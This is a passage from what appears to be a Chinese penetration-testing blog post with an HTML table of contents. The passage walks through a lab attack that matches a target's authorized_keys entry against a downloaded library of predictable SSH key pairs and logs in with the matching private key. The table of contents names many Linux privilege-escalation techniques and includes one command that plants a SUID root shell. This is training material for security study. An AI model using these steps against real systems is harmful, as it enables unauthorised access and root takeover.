+<h3 id="下载公私钥对库"><a href="#下载公私钥对库" class="headerlink" title="下载公私钥对库"></a>下载公私钥对库</h3><p><code>wget</code></p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/6ddca97a3a6f86295fa65562f49d85de.png" alt="image-20251112191040277"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<h3 id="解压缩"><a href="#解压缩" class="headerlink" title="解压缩"></a>解压缩</h3><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>完整单词</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>v</code></td>
+<td><strong>verbose</strong></td>
+<td>显示详细过程（列出正在解压的文件名）</td>
+</tr>
+<tr>
+<td><code>j</code></td>
+<td><strong>bzip2</strong></td>
+<td>通过 bzip2 算法解压缩（对应<code>.tar.bz2</code>或<code>.tbz2</code>）</td>
+</tr>
+<tr>
+<td><code>x</code></td>
+<td><strong>extract</strong></td>
+<td>执行“解包&#x2F;解压”操作</td>
+</tr>
+<tr>
+<td><code>f</code></td>
+<td><strong>file</strong></td>
+<td>后接归档文件名（必须与文件名成对出现）</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tar vjxf 5622.tar.bz2</span><br></pre></td></tr></table></figure>
+
+<p>里面带pub的是公钥，同名（同编号）的是对应的私钥</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/dbb1e39dff5e68d9abf75906413c0005.png" alt="image-20251112191250695"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>解压完会新出现一个rsa的目录，里面就是公私密钥对</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/de40eaf202a6294f0e226c3190a001c9.png" alt="image-20251112191426446"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<h3 id="用authorized-keys的公钥进行搜索"><a href="#用authorized-keys的公钥进行搜索" class="headerlink" title="用authorized_keys的公钥进行搜索"></a>用authorized_keys的公钥进行搜索</h3><p>从ssh-rsa 开始取30-40个数进行搜索就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo grep -lr &quot;xxx&quot;       递归搜索包括找到下级文件</span><br></pre></td></tr></table></figure>
+
+<p>不一定会成功，这个用户的不行就换另一个试试</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/d34b3285f7bf9942e96f0b48273e8787.png" alt="image-20251112192242611"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>找到公钥的编号了，完全一致。接下来找没有扩展名<code>.pub</code>的就是私钥</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/be5a7b7105bd0657f7edf58d7f5cce3a.png" alt="image-20251112192501187"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>将私钥放在熟悉的位置</p>
+<p>接下来尝试ssh登录</p>
+<h3 id="处理ssh登录参数问题（精）"><a href="#处理ssh登录参数问题（精）" class="headerlink" title="处理ssh登录参数问题（精）"></a>处理ssh登录参数问题（精）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ssh -i 私钥文件 obama@10.10.10.25       绵密免密登录</span><br><span class="line">        -i 指定私钥</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/img_convert/8d0ba16d73f69cacde1207eb4e2de73a.png" alt="image-20251112192644612"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<h3 id="主键类型的问题"><a href="#主键类型的问题" class="headerlink" title="主键类型的问题"></a>主键类型的问题</h3><p>无法与22端口进行协商，因为没有匹配的主键类型（之前讲过很多次）</p>
+<p>没有什么就给他什么</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ssh -i 私钥文件 obama@10.10.10.25 -oHostKeyAlgorithms=ssh-rsa,ssh-dss</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/img_convert/aacf7ddd058b310ba1c17fdab52a67eb.png" alt="image-20251112193101808"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>现在获得了banner的交互，他还找我要密码。相当于我给他私钥，但是<strong>是无效</strong>的</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/090d8679a598a7863bb83c8b77d40be9.png" alt="image-20251112193303900"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>如何解决：先看一下ssh连接的详细过程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ssh -i 私钥文件 obama@10.10.10.25 -oHostKeyAlgorithms=ssh-rsa,ssh-dss -vv</span><br></pre></td></tr></table></figure>
+
+<p>他在执行过程中的数据交换，请求，都会在这个调试中列出来debug</p>
+<h3 id="pubkey的问题"><a href="#pubkey的问题" class="headerlink" title="pubkey的问题"></a>pubkey的问题</h3><p>这里说没有共同的签名支持，说明是这行的<strong>pubkey</strong>的问题，给他参数</p>
+<p>签名是类型的问题（第一个）不是认证的问题（第二个）</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/682183f0ebc480b340e42c78aff173f6.png" alt="image-20251112193923468"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ssh -i 私钥文件 obama@10.10.10.25 -oHostKeyAlgorithms=ssh-rsa,ssh-dss -oPubkeyAcceptedKeyTypes=ssh-rsa,ssh-dss</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/direct/e8563273460747beb0a79700f5d12b13.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动"><strong>编辑</strong></p>
+<p>看似是个小问题，没经验的话这条路径就走不通了</p>
+<h3 id="其他可能遇见的问题"><a href="#其他可能遇见的问题" class="headerlink" title="其他可能遇见的问题"></a>其他可能遇见的问题</h3><blockquote>
+<p>[!IMPORTANT]</p>
+<p><strong>用到ssh 经常会有：版本的问题，协议的问题，加密的问题（不会的就-vv显示详细过程，然后ai）</strong></p>
+</blockquote>
+<h4 id="获得初始权限shell"><a href="#获得初始权限shell" class="headerlink" title="获得初始权限shell"></a>获得初始权限shell</h4><p><img src="https://i-blog.csdnimg.cn/direct/48aef156bcd84827b59d80728afd4d23.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动"><strong>编辑</strong></p>
+
+    </article>
+    
+    <div class="read-nums">
+      <!-- id 将作为查询条件 -->
+      <span id="2025/12/27/111/" class="leancloud_visitors" data-flag-title="Your Article Title">
+        <em class="post-meta-item-text">浏览量</em>
+        <i class="leancloud-visitors-count"></i>
+      </span>
+    </div>
+    <div class="comments-intro">
+      <h2>评论区</h2>
+      <p>欢迎你留下宝贵的意见，昵称输入QQ号会显示QQ头像哦~</p>
+    </div>
+    <div id="vcomments" class="vcomments"></div>
+    
+  </div>
+  <div class="article-catelogue">
+    <div class="article-catelogue--wrapper">
+      <div class="catelogue catelogue-1">
+        <h3>目录</h3>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E6%8F%90%E6%9D%83%E7%B2%BE%E8%AE%B2%EF%BC%9A%E5%8E%9F%E7%90%86%E5%92%8C%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.</span> <span class="toc-text">Linux提权精讲：原理和枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%8F%90%E6%9D%83%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">一、提权简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%9D%83%E9%99%90%E4%BD%93%E7%B3%BB%EF%BC%88%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%EF%BC%89"><span class="toc-number">1.2.</span> <span class="toc-text">二、权限体系（安全机制）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%B8%B8%E7%94%A8%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6"><span class="toc-number">1.2.1.</span> <span class="toc-text">1. 常用安全机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%B8%8D%E5%B8%B8%E7%94%A8%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6"><span class="toc-number">1.2.2.</span> <span class="toc-text">2. 不常用安全机制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.</span> <span class="toc-text">三、提权原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9F%BA%E4%BA%8E%E6%9D%83%E9%99%90%E4%BD%93%E7%B3%BB%EF%BC%88%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%EF%BC%89%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.1.</span> <span class="toc-text">1. 基于权限体系（安全机制）的利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%9F%BA%E4%BA%8E%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.2.</span> <span class="toc-text">2. 基于用户行为的利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%86%85%E5%AD%98%E5%92%8C-CPU-%E5%B1%82%E9%9D%A2"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.内存和 CPU 层面</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%8F%90%E6%9D%83%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.4.</span> <span class="toc-text">四、提权枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8D%87%E7%BA%A7%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%8F%90%E7%A4%BA%E7%AC%A6-%E4%B9%9F%E5%8F%AB%E7%BB%88%E7%AB%AF%E5%8D%87%E7%BA%A7%EF%BC%88%E7%B2%BE%EF%BC%89"><span class="toc-number">1.4.1.</span> <span class="toc-text">1. 升级命令行提示符 &#x2F; 也叫终端升级（精）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%89%8B%E5%B7%A5%E6%9E%9A%E4%B8%BE%EF%BC%88%E6%9C%80%E9%87%8D%E8%A6%81%EF%BC%8C%E6%9C%80%E5%89%8D%EF%BC%89"><span class="toc-number">1.4.2.</span> <span class="toc-text">2. 手工枚举（最重要，最前）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-%E6%9E%9A%E4%B8%BE%E7%94%A8%E6%88%B7%E5%92%8C%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">2.1 枚举用户和系统信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-%E6%9E%9A%E4%B8%BE%E6%96%87%E4%BB%B6%E5%92%8C%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">2.2 枚举文件和进程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-%E6%9E%9A%E4%B8%BE%E7%BD%91%E7%BB%9C%E5%92%8C%E6%8C%82%E8%BD%BD"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">2.3 枚举网络和挂载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-%E6%9E%9A%E4%B8%BE%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="toc-number">1.4.2.4.</span> <span class="toc-text">2.4 枚举当前用户权限</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%9E%9A%E4%B8%BE%E5%B7%A5%E5%85%B7"><span class="toc-number">1.4.3.</span> <span class="toc-text">3. 自动化枚举工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE"><span class="toc-number">1.5.1.</span> <span class="toc-text">思维导图</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E6%8F%90%E6%9D%83%E7%B2%BE%E8%AE%B2%EF%BC%9A%E6%BC%94%E7%A4%BA1-%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8F%90%E6%9D%83%EF%BC%8C%E4%BB%A5MySQL-UDF%E6%8F%90%E6%9D%83%E4%B8%BA%E4%BE%8B"><span class="toc-number">2.</span> <span class="toc-text">Linux提权精讲：演示1 - 服务漏洞利用提权，以MySQL-UDF提权为例</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.1.</span> <span class="toc-text">提权条件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%8E%8C%E6%8F%A1MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E8%B4%A6%E5%8F%B7%EF%BC%8C%E6%9C%89creat%EF%BC%8Cinsert%EF%BC%8Cdelete%E2%80%A6%E4%BB%A5%E5%88%9B%E5%BB%BA%E5%92%8C%E4%BD%BF%E7%94%A8%E5%87%BD%E6%95%B0%EF%BC%88%E6%9C%80%E5%A5%BD%E6%98%AFroot%E6%9D%83%E9%99%90%EF%BC%89"><span class="toc-number">2.1.1.</span> <span class="toc-text">1.掌握MySQL数据库的账号，有creat，insert，delete…以创建和使用函数（最好是root权限）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84secure-file-priv-%E6%9D%83%E9%99%90%E5%9F%BA%E6%9C%AC%E4%B8%80%E8%88%AC%E5%BF%85%E9%A1%BB%E4%B8%BA%E7%A9%BA-%E2%80%98-%E2%80%98%EF%BC%88%E5%8D%B3%E9%BB%98%E8%AE%A4%E8%AE%BE%E7%BD%AE%E6%88%96%E5%8C%85%E5%90%AB%E6%89%80%E9%9C%80%E7%9B%AE%E5%BD%95plugin%EF%BC%89"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.MySQL数据库的secure_file_priv 权限基本一般必须为空 ‘ ‘（即默认设置或包含所需目录plugin）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B"><span class="toc-number">2.2.</span> <span class="toc-text">提权过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1518-c-%E5%8F%88%E5%8F%AB-raptor-udf2-c%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E6%8F%90%E6%9D%83%E6%BC%94%E7%A4%BA"><span class="toc-number">2.2.1.</span> <span class="toc-text">1518.c 又叫 raptor_udf2.c利用文件提权演示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-g"><span class="toc-number">2.2.2.</span> <span class="toc-text">1. -g</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-c"><span class="toc-number">2.2.3.</span> <span class="toc-text">2. -c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-raptor-udf2-c"><span class="toc-number">2.2.4.</span> <span class="toc-text">3. raptor_udf2.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-fPIC"><span class="toc-number">2.2.5.</span> <span class="toc-text">4. -fPIC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">2.3.</span> <span class="toc-text">总结：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE-1"><span class="toc-number">2.3.1.</span> <span class="toc-text">思维导图</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E6%8F%90%E6%9D%83%E7%B2%BE%E8%AE%B2%EF%BC%9A%E6%BC%94%E7%A4%BA2-%E9%87%8D%E7%A3%85%E5%A4%A7%E4%BD%9C%EF%BC%81Linux%E6%8F%90%E6%9D%83%E5%A4%A7%E8%B5%8F%EF%BC%8C20%E7%A7%8DLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8F%90%E6%9D%83%E6%BC%94%E7%A4%BA%E7%B2%BE%E8%AE%B2%E4%B8%80%E6%AC%A1%E7%9C%8B%E5%AE%8C%EF%BC%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%BF%85%E4%BF%AE%E8%AF%BE%E4%B8%80%E6%AC%A1%E5%BD%BB%E5%BA%95%E6%90%9E%E5%AE%9A%EF%BC%81"><span class="toc-number">3.</span> <span class="toc-text">Linux提权精讲：演示2 - 重磅大作！Linux提权大赏，20种Linux渗透测试提权演示精讲一次看完，渗透测试必修课一次彻底搞定！</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#shadow%E5%92%8Cpasswd-3%E8%AE%B2"><span class="toc-number">3.1.</span> <span class="toc-text">shadow和passwd 3讲</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8F%AF%E8%AF%BBshadow%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.1.</span> <span class="toc-text">1,可读shadow文件利用提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%EF%BC%8C%E5%8F%AF%E5%86%99shadow%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.2.</span> <span class="toc-text">2，可写shadow文件利用提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%EF%BC%8C%E5%8F%AF%E5%86%99passwd%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.3.</span> <span class="toc-text">3，可写passwd文件利用提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83"><span class="toc-number">3.2.</span> <span class="toc-text">sudo环境变量提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B-1"><span class="toc-number">3.2.1.</span> <span class="toc-text">提权过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E9%80%BB%E8%BE%91"><span class="toc-number">3.2.2.</span> <span class="toc-text">提权逻辑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%85%B1%E4%BA%AB%E5%BA%93"><span class="toc-number">3.2.3.</span> <span class="toc-text">什么是共享库</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E4%BB%BB%E5%8A%A1-3%E8%AE%B2"><span class="toc-number">3.3.</span> <span class="toc-text">自动任务 3讲</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%EF%BC%8C%E8%87%AA%E5%8A%A8%E4%BB%BB%E5%8A%A1%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E6%8F%90%E6%9D%83"><span class="toc-number">3.3.1.</span> <span class="toc-text">1，自动任务文件权限提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%EF%BC%8C%E8%87%AA%E5%8A%A8%E4%BB%BB%E5%8A%A1PATH%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83"><span class="toc-number">3.3.2.</span> <span class="toc-text">2，自动任务PATH环境变量提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%EF%BC%8C%E8%87%AA%E5%8A%A8%E4%BB%BB%E5%8A%A1%E9%80%9A%E9%85%8D%E7%AC%A6-%E2%80%98-%E2%80%98-%E6%8F%90%E6%9D%83"><span class="toc-number">3.3.3.</span> <span class="toc-text">3，自动任务通配符 ‘*‘ 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tar-%E7%9A%84-Checkpoint-%E6%9C%BA%E5%88%B6"><span class="toc-number">3.3.4.</span> <span class="toc-text">tar 的 Checkpoint 机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">3.3.5.</span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0-sudo-%E7%99%BD%E5%90%8D%E5%8D%95"><span class="toc-number">3.3.5.1.</span> <span class="toc-text">① sudo 白名单</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1-cron-root-%E5%AE%9A%E6%97%B6%E5%A4%87%E4%BB%BD%E8%84%9A%E6%9C%AC"><span class="toc-number">3.3.5.2.</span> <span class="toc-text">② cron&#x2F;root 定时备份脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tar%E7%9A%84sudo%E7%99%BD%E5%90%8D%E5%8D%95%E6%8F%90%E6%9D%83%E4%B8%8A%E4%B8%8B"><span class="toc-number">3.3.6.</span> <span class="toc-text">tar的sudo白名单提权上下</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUID%E6%8F%90%E6%9D%83-5%E8%AE%B2"><span class="toc-number">3.4.</span> <span class="toc-text">SUID提权 5讲</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-SUID%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E5%B7%B2%E7%9F%A5%E5%88%A9%E7%94%A8%E6%8F%90%E6%9D%83"><span class="toc-number">3.4.1.</span> <span class="toc-text">1.SUID可执行文件已知利用提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-SUID%E5%85%B1%E4%BA%AB%E5%BA%93%E6%B3%A8%E5%85%A5%E6%8F%90%E6%9D%83"><span class="toc-number">3.4.2.</span> <span class="toc-text">2.SUID共享库注入提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shared-Object%EF%BC%88%E5%85%B1%E4%BA%AB%E5%BA%93%EF%BC%89-%E2%98%85%E2%98%85%E2%98%85-%E6%9C%80%E5%B8%B8%E8%A7%81-99"><span class="toc-number">3.4.3.</span> <span class="toc-text">Shared Object（共享库） ★★★ 最常见 99%</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-SUID%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%88%A9%E7%94%A8%E6%8F%90%E6%9D%83"><span class="toc-number">3.4.4.</span> <span class="toc-text">3.SUID环境变量利用提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%AF%E7%A4%BA"><span class="toc-number">3.4.4.1.</span> <span class="toc-text">启示</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A7%E7%94%A8SUID-shell%E5%8A%9F%E8%83%BD%E6%8F%90%E5%8F%96-1-version"><span class="toc-number">3.4.5.</span> <span class="toc-text">巧用SUID-shell功能提取#1 version&lt;4.2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%A8%B3%E9%80%89%E6%8B%A9%EF%BC%9ACVE-2014-6271-%E2%80%9CShellshock%E2%80%9D"><span class="toc-number">3.4.6.</span> <span class="toc-text">最稳选择：CVE-2014-6271 “Shellshock”</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0%EF%BC%88%E7%BA%AF-shell-%E5%9C%BA%E6%99%AF%EF%BC%89"><span class="toc-number">3.4.7.</span> <span class="toc-text">一、本地复现（纯 shell 场景）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A7%E7%94%A8SUID-shell%E5%8A%9F%E8%83%BD%E6%8F%90%E5%8F%96-2"><span class="toc-number">3.4.8.</span> <span class="toc-text">巧用SUID-shell功能提取#2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A0-env-i"><span class="toc-number">3.4.9.</span> <span class="toc-text">① env -i</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A1-SHELLOPTS-xtrace"><span class="toc-number">3.4.10.</span> <span class="toc-text">② SHELLOPTS&#x3D;&#39;xtrace&#39;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A2-PS4-cp-bin-bash-tmp-rootbash-chmod-xs-tmp-rootbash"><span class="toc-number">3.4.11.</span> <span class="toc-text">③ PS4&#x3D;&#39;$(cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;rootbash; chmod +xs &#x2F;tmp&#x2F;rootbash)&#39;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A3-usr-local-bin-suid-env2"><span class="toc-number">3.4.12.</span> <span class="toc-text">④ &#x2F;usr&#x2F;local&#x2F;bin&#x2F;suid-env2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%92%8C%E5%AF%86%E9%92%A5%E6%8F%90%E6%9D%83-3%E8%AE%B2"><span class="toc-number">3.5.</span> <span class="toc-text">密码和密钥提权 3讲</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AF%86%E7%A0%81%E5%92%8C%E5%AF%86%E9%92%A5%E5%8E%86%E5%8F%B2%E6%96%87%E4%BB%B6%E6%8F%90%E6%9D%83"><span class="toc-number">3.5.1.</span> <span class="toc-text">1.密码和密钥历史文件提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%EF%BC%9A"><span class="toc-number">3.5.1.1.</span> <span class="toc-text">其他：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AF%86%E7%A0%81%E5%AF%86%E9%92%A5%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E6%8F%90%E6%9D%83"><span class="toc-number">3.5.2.</span> <span class="toc-text">2.密码密钥配置文件查看提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-SSH%E5%AF%86%E9%92%A5%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%8F%90%E6%9D%83"><span class="toc-number">3.5.3.</span> <span class="toc-text">3.SSH密钥敏感信息提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NFS%E6%8F%90%E6%9D%83"><span class="toc-number">3.6.</span> <span class="toc-text">NFS提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8F%90%E6%9D%83"><span class="toc-number">3.7.</span> <span class="toc-text">内核漏洞利用提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#doas-less-vi%E6%8F%90%E6%9D%83"><span class="toc-number">3.8.</span> <span class="toc-text">doas less + vi提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">3.8.1.</span> <span class="toc-text">相关知识点</span></a><ol class="toc-child"><li class="toc-item 